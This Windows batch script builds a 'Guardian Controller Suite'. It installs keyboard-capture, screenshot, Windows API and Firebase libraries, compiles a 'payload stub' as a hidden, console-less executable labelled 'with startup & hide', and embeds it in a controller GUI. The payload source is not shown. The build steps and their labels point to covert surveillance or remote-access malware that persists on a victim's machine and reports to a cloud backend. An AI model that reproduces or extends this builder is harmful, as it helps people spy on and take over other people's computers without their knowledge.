@echo off
title Building Guardian Controller Suite
echo ==========================================
echo Building Guardian Controller Suite
echo ==========================================

echo [1/4] Checking Python...
python --version
if errorlevel 1 (
    echo ERROR: Python not found!
    pause
    exit /b
)

echo [2/4] Installing Libraries...
python -m pip install --quiet pyinstaller PyQt6 firebase-admin psutil pynput mss pywin32

echo [3/4] Compiling Payload Stub (with startup & hide)...
if exist dist rmdir /s /q dist
if exist build rmdir /s /q build
if exist controller_embedded.py del controller_embedded.py
python -m PyInstaller --onefile --noconsole --name payload_stub --hidden-import=win32gui --hidden-import=win32api --hidden-import=psutil --hidden-import=mss --hidden-import=firebase_admin --hidden-import=requests --hidden-import=json --hidden-import=time --hidden-import=traceback --hidden-import=winreg payload_stub.py
if errorlevel 1 (
    echo ERROR: Payload build failed!
    pause
    exit /b
)

echo [4/4] Building Controller GUI...
python embed_payload.py
if errorlevel 1 (
    echo ERROR: Embedding failed!
    pause
    exit /b
)
python -m PyInstaller --onefile --windowed --name GuardianController --hidden-import=win32gui --hidden-import=win32api --hidden-import=psutil --hidden-import=mss --hidden-import=firebase_admin --hidden-import=requests --hidden-import=json --hidden-import=time --hidden-import=traceback --hidden-import=PyQt6 controller_embedded.py
if errorlevel 1 (
    echo ERROR: Controller build failed!
    pause
    exit /b
)

echo ==========================================
echo SUCCESS! File at: dist\GuardianController.exe
echo ==========================================
pause